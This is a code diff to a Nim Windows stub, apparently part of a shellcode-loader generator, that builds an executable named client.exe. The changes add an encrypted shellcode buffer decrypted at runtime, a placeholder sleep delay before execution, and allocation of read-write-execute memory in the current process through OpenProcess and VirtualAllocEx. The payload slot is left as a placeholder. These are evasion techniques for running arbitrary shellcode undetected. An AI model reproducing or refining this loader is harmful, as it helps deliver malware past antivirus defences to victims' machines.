@@ -1,14 +1,19 @@
 # nim c --app:console --cpu:amd64 --os:windows --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc -d:release -d:strip --opt:size -o:build/client.exe stubs/EnumCalendarInfo.nim
 import winim
+include crypt
 
 SHELLCODE_PLACEHOLDER
 
 proc Execute(shellcode: openarray[byte]):void =
 
     var size  = cast[SIZE_T](len(shellcode))
+    
+    let tProcess = GetCurrentProcessId()
+    var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)
 
-    let rPtr = VirtualAlloc(
-        nil,
+    let rPtr = VirtualAllocEx(
+        pHandle,
+        NULL,
         size,
         MEM_COMMIT,
         PAGE_EXECUTE_READWRITE
@@ -25,4 +30,6 @@ proc Execute(shellcode: openarray[byte]):void =
 
 when defined(windows):
     when isMainModule:
-        Execute(buf)
+        Sleep(SLEEP_PLACEHOLDER * 1000)
+        var shellcode = cipher(buf)
+        Execute(shellcode)
